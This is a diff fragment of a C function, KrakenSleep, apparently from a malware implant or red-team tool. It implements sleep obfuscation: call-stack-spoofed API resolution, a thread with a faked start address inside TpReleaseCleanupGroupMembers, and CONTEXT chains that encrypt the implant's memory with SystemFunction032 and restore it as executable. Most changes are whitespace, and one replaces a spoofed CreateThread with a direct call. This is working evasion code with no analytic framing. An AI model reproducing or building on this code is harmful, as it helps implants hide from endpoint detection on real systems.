@@ -17,12 +17,12 @@ VOID KrakenSleep(DWORD dwSleepTime) {
 	PVOID pNtdllAddr							= GetNtdllAddr();
 	PVOID pAdvAPI								= SPOOF(LoadLibraryA, "Advapi32");
 	
-	UINT_PTR pTpReleaseCleanupGroupMembers		= SPOOF(GetProcAddress, pNtdllAddr, "TpReleaseCleanupGroupMembers");
-	PVOID	 pNtContinue						= SPOOF(GetProcAddress, pNtdllAddr, "NtContinue");
+	UINT_PTR pTpReleaseCleanupGroupMembers					= SPOOF(GetProcAddress, pNtdllAddr, "TpReleaseCleanupGroupMembers");
+	PVOID	 pNtContinue							= SPOOF(GetProcAddress, pNtdllAddr, "NtContinue");
 	PVOID pNtTestAlert							= SPOOF(GetProcAddress, pNtdllAddr, "NtTestAlert");
-	PVOID pSystemFunction032					= SPOOF(GetProcAddress, pAdvAPI, "SystemFunction032");
+	PVOID pSystemFunction032						= SPOOF(GetProcAddress, pAdvAPI, "SystemFunction032");
 
-	fnNtAlertResumeThread pNtAlertResumeThread							= SPOOF(GetProcAddress, pNtdllAddr, "NtAlertResumeThread");
+	fnNtAlertResumeThread pNtAlertResumeThread				= SPOOF(GetProcAddress, pNtdllAddr, "NtAlertResumeThread");
 	fnNtSignalAndWaitForSingleObject pNtSignalAndWaitForSingleObject	= SPOOF(GetProcAddress, pNtdllAddr, "NtSignalAndWaitForSingleObject");
 
 	HANDLE hEvent = SPOOF_0(CreateEventW);
@@ -44,8 +44,7 @@ VOID KrakenSleep(DWORD dwSleepTime) {
 
 	// We spoof the thread start address
 	pTpReleaseCleanupGroupMembers += 0x450;
-	HANDLE hThread = SPOOF(CreateThread, NULL, 65535, pTpReleaseCleanupGroupMembers, NULL, CREATE_SUSPENDED, &dwTid);
-
+	HANDLE hThread = CreateThread(NULL, 65535, pTpReleaseCleanupGroupMembers, NULL, CREATE_SUSPENDED, &dwTid);
 
 	if (hThread != NULL) {
 		DWORD dwOldProtect = 0;
@@ -58,7 +57,6 @@ VOID KrakenSleep(DWORD dwSleepTime) {
 		RtlCopyMemory(&ctxE, &ctx, sizeof(CONTEXT));
 		RtlCopyMemory(&ctxEvent, &ctx, sizeof(CONTEXT));
 		RtlCopyMemory(&ctxEnd, &ctx, sizeof(CONTEXT));
-
 
 		ctxA.Rip = VirtualProtect;
 		ctxA.Rcx = SecInfo.pAddr;
@@ -83,14 +81,12 @@ VOID KrakenSleep(DWORD dwSleepTime) {
 		ctxD.Rdx = &usKey;
 		*(PULONG_PTR)ctxD.Rsp = (ULONG_PTR)pNtTestAlert;
 
-
 		ctxE.Rip = VirtualProtect;
 		ctxE.Rcx = SecInfo.pAddr;
 		ctxE.Rdx = SecInfo.dwSize;
 		ctxE.R8 = PAGE_EXECUTE_READWRITE;
 		ctxE.R9 = &dwOldProtect;
 		*(PULONG_PTR)ctxE.Rsp = (ULONG_PTR)pNtTestAlert;
-
 
 		ctxEvent.Rip = SetEvent;
 		ctxEvent.Rcx = hEvent;
